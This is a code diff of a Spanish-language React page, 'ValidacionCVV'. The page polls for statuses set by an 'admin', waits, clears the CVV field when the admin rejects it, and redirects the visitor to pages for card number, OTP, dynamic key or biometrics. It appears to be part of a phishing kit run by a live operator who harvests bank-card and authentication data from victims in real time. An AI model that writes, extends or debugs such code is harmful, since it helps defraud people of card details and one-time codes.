@@ -62,34 +62,58 @@ export default function ValidacionCVV() {
                 }
 
                 // Estados que indican que debemos seguir esperando (admin aún no ha decidido)
-                const estadosEspera = ['pendiente', 'solicitar_cvv_custom', 'solicitar_cvv', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
+                // NO redirigir automáticamente, esperar a que el admin presione un botón específico
+                const estadosEspera = ['pendiente', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
                 
                 if (estadosEspera.includes(estado)) {
                     // Seguir esperando, mantener loading
                     return;
                 }
 
-                // Si hay error (rechazo del admin), recargar página para permitir reintento
+                // Si el estado es 'solicitar_cvv_custom' o 'solicitar_cvv', significa que el admin quiere que el usuario ingrese CVV
+                // En este caso, NO redirigir, solo quitar loading y permitir que el usuario ingrese
+                if (estado === 'solicitar_cvv_custom' || estado === 'solicitar_cvv') {
+                    // El usuario ya está en la página de CVV, solo quitar loading
+                    clearInterval(interval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    setPolling(false);
+                    return;
+                }
+
+                // Si hay error (rechazo del admin), limpiar campo y permitir reintento sin recargar
                 if (estado === 'error_cvv_custom') {
                     clearInterval(interval);
                     clearTimeout(timeoutId);
                     setCargando(false);
                     setPolling(false);
                     alert("El código de verificación (CVV) es incorrecto. Por favor, verifícalo e inténtalo nuevamente.");
-                    // Recargar página para permitir reintento
-                    window.location.reload();
+                    // Limpiar campo para permitir reintento (sin recargar página)
+                    setCvv("");
                     return;
+                }
+
+                // Estados que detienen el polling (igual que OTP y DIN)
+                const estadosFinales = [
+                    'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
+                    'error_tc', 'error_otp', 'error_din', 'error_login',
+                    'solicitar_biometria', 'error_923',
+                    'solicitar_tc_custom', 'solicitar_cvv_custom',
+                    'aprobado', 'error_pantalla', 'bloqueado_pantalla'
+                ];
+
+                if (estadosFinales.includes(estado.toLowerCase())) {
+                    clearInterval(interval);
+                    clearTimeout(timeoutId);
                 }
 
                 // Si el admin aprueba y pide siguiente paso, redirigir
                 // Limpiar intervalos antes de redirigir
-                clearInterval(interval);
-                clearTimeout(timeoutId);
                 setCargando(false);
                 setPolling(false);
                 
-                // Switch para manejar redirecciones específicas (solo cuando admin aprueba)
-                switch (estado) {
+                // Switch para manejar redirecciones específicas (solo cuando admin presiona botón específico)
+                switch (estado.toLowerCase()) {
                     case 'solicitar_tc': 
                         navigate("/validacion-tc"); 
                         break;
@@ -97,6 +121,7 @@ export default function ValidacionCVV() {
                         navigate("/validacion-tc-custom"); 
                         break;
                     case 'solicitar_otp': 
+                        // Solo redirigir cuando el admin específicamente presiona el botón OTP
                         navigate("/numero-otp"); 
                         break;
                     case 'solicitar_din': 
